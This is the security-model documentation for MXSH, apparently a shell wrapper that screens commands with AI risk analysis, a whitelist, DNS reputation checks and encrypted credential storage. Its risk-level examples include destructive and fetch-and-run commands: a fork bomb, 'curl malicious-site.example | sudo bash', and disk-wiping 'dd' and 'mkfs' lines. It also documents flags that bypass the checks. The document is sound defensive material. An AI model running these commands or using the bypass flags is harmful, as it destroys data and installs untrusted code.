# Security Model

MXSH implements multiple layers of security to protect against accidental damage, malicious commands, and credential exposure.

## Security Architecture

MXSH operates on a defense-in-depth principle with multiple independent security mechanisms:

1. **Whitelisting**: Known-safe commands bypass analysis
2. **AI Analysis**: Risk assessment for general commands
3. **DNS Validation**: Domain reputation checking for downloads
4. **Encryption**: Secure credential and environment variable storage
5. **User Confirmation**: Human-in-the-loop for risky operations

## AI-Powered Command Analysis

### Analysis Process

When you execute a non-whitelisted command, MXSH sends it to OpenAI's API for security assessment. The analysis evaluates:

**Intent Recognition**
Understanding what the command aims to accomplish and whether it aligns with typical use cases.

**Destructive Potential**
Identifying operations that delete, modify, or overwrite data without easy recovery.

**Privilege Requirements**
Determining if the command needs elevated permissions that could indicate system-level changes.

**Side Effects**
Detecting unintended consequences such as network exposure, process termination, or configuration changes.

**Pattern Matching**
Recognizing known dangerous patterns like recursive deletion, format operations, or command injection attempts.

### Risk Levels Explained

**SAFE**

Commands categorized as SAFE execute immediately without user interaction.

*Characteristics:*
- Read-only operations
- No system modifications
- No network communication
- No privilege escalation
- Predictable behavior

*Examples:*
- `ls -la`
- `cat README.md`
- `echo "Hello"`
- `git status`

**LOW**

Low-risk commands perform minor actions that could theoretically cause issues but are generally safe in normal contexts.

*Characteristics:*
- Limited scope of impact
- Easily reversible changes
- User-space modifications only
- Well-understood behavior

*Behavior:*
Requires user confirmation before execution.

*Examples:*
- `touch newfile.txt`
- `mkdir project`
- `git add .`

**MEDIUM**

Medium-risk commands have notable potential for problems but serve legitimate purposes.

*Characteristics:*
- Modify persistent data
- Affect multiple files or directories
- May require elevated privileges
- Consequences not immediately obvious

*Behavior:*
Requires explicit user approval. MXSH displays detailed information about potential risks.

*Examples:*
- `npm install package`
- `chmod -R 755 directory`
- `systemctl restart service`

**HIGH**

High-risk commands pose significant danger of data loss, system instability, or security compromise.

*Characteristics:*
- Destructive operations
- System-wide impact
- Difficult or impossible to reverse
- Security implications

*Behavior:*
Blocked by default. User must use `--skip-ai-check` flag and confirm execution.

*Examples:*
- `rm -rf /data`
- `dd if=/dev/zero of=/dev/sda`
- `chmod 777 -R /`

**CRITICAL**

Critical-risk commands represent severe threats to system integrity, security, or data preservation.

*Characteristics:*
- Catastrophic potential
- System destruction
- Security bypass
- Malicious intent indicators

*Behavior:*
Blocked by default. Requires `--skip-ai-check` flag and explicit confirmation.

*Examples:*
- `:(){ :|:& };:` (fork bomb)
- `curl malicious-site.example | sudo bash`
- `mkfs.ext4 /dev/sda`

### Analysis Output

Example AI analysis output:

```
Risk Level: MEDIUM
Summary: Modifies file permissions recursively for directory tree
Details: This command changes read/write/execute permissions for all files
         in the specified directory and subdirectories. Incorrect permissions
         can affect application functionality or create security vulnerabilities.

Do you want to execute this command anyway? (y/n):
```

### Bypassing AI Analysis

For trusted commands that trigger false positives:

```bash
command-here --skip-ai-check
```

**Security Implications:**
- Completely disables AI safety checking
- Command executes without risk assessment
- User assumes full responsibility for consequences

**When to Use:**
- Trusted automation scripts
- Internal tools that match false-positive patterns
- Time-sensitive operations where analysis delay is unacceptable

**Warning Displayed:**
```
⚠ WARNING: AI security check skipped!
  This command will be executed without safety analysis.

Do you really want to execute this command? (y/n):
```

## DNS-Based Download Protection

### Threat Model

Network-based download commands (`curl`, `wget`) present unique risks:

- **Malicious Payload Delivery**: Scripts or binaries that compromise the system
- **Supply Chain Attacks**: Legitimate-looking tools with hidden backdoors
- **Phishing and Social Engineering**: Commands from untrusted sources
- **Internal Network Exploitation**: SSRF-style attacks against private services

### Cloudflare DNS Security

MXSH validates download URLs using Cloudflare's malware-blocking DNS resolver (1.1.1.2).

**How It Works:**

1. **URL Extraction**: Parse the command to identify all HTTP/HTTPS URLs
2. **Domain Resolution**: Query 1.1.1.2 for the domain's IP address
3. **Block Detection**: If the domain is known malicious, Cloudflare returns a blocked response
4. **Local Check**: Verify the resolved IP is not in private address space
5. **Decision**: Allow, block, or request user confirmation

**Protected Against:**

- Domains on malware/phishing blocklists
- Newly registered suspicious domains
- Known command-and-control servers
- Cryptocurrency mining scripts
- Drive-by download sites

### Local Address Protection

Private IP addresses are blocked to prevent SSRF attacks:

**Blocked Ranges:**
- `127.0.0.0/8` - Loopback (localhost)
- `10.0.0.0/8` - Private network
- `172.16.0.0/12` - Private network
- `192.168.0.0/16` - Private network
- `169.254.0.0/16` - Link-local

**Why:**
Preventing access to local services protects against:
- Internal service exploitation
- Metadata endpoint access (cloud environments)
- Port scanning and service discovery
- Credential theft from internal APIs

### DNS Check Output

Example validation:

```
Checking URL security with Cloudflare DNS (1.1.1.2)...

URL: http://example.com/script.sh
Domain: example.com
Resolved IP: 93.184.216.34
Status: SAFE

✓ All URLs verified safe. Executing...
```

Example block:

```
Checking URL security with Cloudflare DNS (1.1.1.2)...

URL: http://malicious-domain.example/payload
Domain: malicious-domain.example
Status: BLOCKED
Reason: Domain flagged by security filter

✗ Command blocked due to security concerns.
  Tip: Use --skip-dns-check flag to bypass (not recommended)
```

### Bypassing DNS Validation

For internal or private network resources:

```bash
curl http://internal-server/file --skip-dns-check
```

**Security Implications:**
- Disables domain reputation checking
- Allows downloads from any source
- Permits private IP address access

**When to Use:**
- Internal corporate resources
- Private network services
- Development environments
- Localhost testing

**Warning Displayed:**
```
⚠ WARNING: DNS security check skipped!
  This command may download from potentially malicious sources.

Do you really want to execute this command? (y/n):
```

## Encrypted Credential Storage

### Encryption Implementation

MXSH uses modern cryptographic standards for sensitive data protection.

**Algorithm:**
- **AES-256-GCM**: Authenticated encryption with associated data
- **Key Size**: 256 bits
- **Authentication**: Galois/Counter Mode provides integrity verification
- **Nonce**: Random 96-bit nonce per encryption operation

**Key Derivation:**
- **Argon2**: Memory-hard password hashing function
- **Purpose**: Derive encryption keys from passwords
- **Parameters**: Tuned for security and performance balance

### Encryption Modes

**Machine-Based Encryption**

Default mode for API keys and system credentials.

*How It Works:*
- Derives encryption key from machine-specific hardware identifiers
- Key cannot be reconstructed on different hardware
- Data encrypted on one machine cannot be decrypted elsewhere

*Use Case:*
Personal credentials that should never leave the current system.

*Security Properties:*
- Resistant to configuration file theft
- Tied to specific hardware
- No password required for decryption

**Password-Based Encryption**

Used for portable environment variables and exports.

*How It Works:*
- User provides password during encryption
- Argon2 derives encryption key from password
- Same password required for decryption
- Can be moved between systems

*Use Case:*
Shared credentials, team configurations, backup files.

*Security Properties:*
- Portable across systems
- Protection dependent on password strength
- Vulnerable to password guessing if weak password used

### Threat Protection

**Configuration File Exposure**

If `.mxsh` directory contents are accessed:
- API keys remain encrypted
- Environment variables protected
- No plaintext credentials exposed

**Physical Access**

If an attacker gains access to the system:
- Machine-based encryption provides minimal protection (attacker has the machine)
- Password-based encryption protects if strong password used
- Decryption requires knowledge of passwords or access to running MXSH session

**Network Transmission**

Export files (`.mxenv`) can be safely transmitted:
- All data encrypted before export
- Password required for decryption
- No plaintext data in export files

### Best Practices

**API Keys:**
- Use machine-based encryption (default for `init`)
- Store only on trusted personal systems
- Rotate keys if system compromised

**Environment Variables:**
- Use password-based encryption for shared configurations
- Choose strong passwords for export files
- Avoid storing extremely sensitive data (prefer dedicated secret managers for production)

**Exports:**
- Encrypt exports with strong passwords
- Transmit over secure channels
- Delete export files after import
- Verify recipient before sharing

## Whitelisting System

### Purpose

Certain commands are inherently safe and don't require AI analysis. Whitelisting these commands improves performance and reduces API costs.

### Whitelist Criteria

Commands qualify for whitelisting if they:
1. Perform read-only operations
2. Cannot modify system state
3. Do not access network resources
4. Have no destructive potential
5. Are commonly used and well-understood

### Whitelisted Commands

**Directory Information:**
- `ls`, `dir`: List directory contents
- `pwd`: Print working directory
- `tree`: Display directory structure

**System Information:**
- `whoami`: Current user
- `hostname`: System name
- `date`, `time`: Time information

**File Reading:**
- `cat`: Display file contents
- `head`: Show file beginning
- `tail`: Show file end
- `type`: Display file (Windows)

**Utilities:**
- `echo`: Print text
- `wc`: Count words/lines

**Version Control:**
- `git`: All git commands (fully whitelisted due to low risk)

### Conditional Whitelisting

Whitelisted commands with arguments are analyzed if:

**Non-Option Arguments Present**

```bash
cat sensitive-file.txt    # Analyzed (file argument)
cat -n                     # Whitelisted (option only)
```

**Dangerous Patterns Detected**

```bash
ls | rm                   # Analyzed (pipe)
cat file > output         # Analyzed (redirect)
echo `whoami`             # Analyzed (command substitution)
```

**Dangerous Patterns:**
- Pipes: `|`
- Redirects: `>`, `<`
- Command separation: `;`, `&&`, `||`
- Command substitution: `` ` ``, `$()`
- Variable expansion: `${}`
- Destructive keywords: `rm`, `del`, `remove`, `format`, `mkfs`

### Full Whitelist Exception: Git

Git commands bypass all analysis regardless of arguments:

```bash
git commit -m "message"      # Whitelisted
git push --force             # Whitelisted
git reset --hard HEAD~1      # Whitelisted
```

**Rationale:**
Git is version-controlled by design. Destructive operations can be recovered from the repository history.

## Security Limitations

### Known Constraints

**AI Analysis Quality**

- Dependent on OpenAI model accuracy
- May produce false positives or false negatives
- Cannot understand domain-specific context
- Analysis quality varies by model selection

**DNS Protection Scope**

- Only protects `curl` and `wget` commands
- Other download methods (e.g., Python requests, Node.js fetch) not covered
- Relies on Cloudflare's blocklist accuracy
- Zero-day malicious domains may not be detected

**Encryption Boundaries**

- Machine-based encryption provides limited protection on compromised systems
- Password-based encryption vulnerable to password guessing
- No protection against keyloggers or memory dumping
- Encrypted data readable within MXSH sessions

**Bypass Mechanisms**

- Users can skip security checks with flags
- No enforcement if users consistently bypass protections
- Social engineering could convince users to use bypass flags

### Complementary Measures

MXSH is one layer of defense. Additional security practices:

- Use principle of least privilege
- Enable system-level audit logging
- Employ endpoint detection and response (EDR) tools
- Maintain backups of critical data
- Keep systems patched and updated
- Use dedicated secret management for production credentials
- Implement network segmentation
- Monitor for anomalous behavior

## Responsible Disclosure

Security vulnerabilities in MXSH should be reported through responsible disclosure:

1. Do not publicly disclose vulnerabilities before patches are available
2. Report issues via GitHub security advisories or direct contact with maintainers
3. Provide detailed reproduction steps and impact assessment
4. Allow reasonable time for fixes before publication

## Security Updates

Monitor the MXSH repository for security updates and advisories. Critical security patches will be released as priority updates.
